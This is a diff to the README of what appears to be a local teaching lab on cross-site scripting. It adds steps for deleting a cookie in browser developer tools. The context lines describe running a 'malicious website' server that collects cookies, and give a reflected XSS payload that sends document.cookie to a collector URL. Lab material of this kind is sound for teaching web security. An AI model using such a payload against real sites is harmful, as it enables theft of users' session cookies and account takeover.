@@ -28,6 +28,12 @@ the page. If you want to clear the database, just delete the `database.db` file 
 * Go to [127.0.0.1:5000/cookie](http://127.0.0.1:5000/cookie) to create set a cookie for the main website
 * Run `python app.py` in the malicious website folder to run the malicious server to collect the cookies
 
+To delete the cookie:
+* Go to inspect element
+* Go to Application Tab
+* Click on cookies
+* Right click on the entry that you want to delete
+
 ## Demostration for reflected XSS
 * Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the query blank
 * Notice that the code is reflected inside the addressbar as a query.
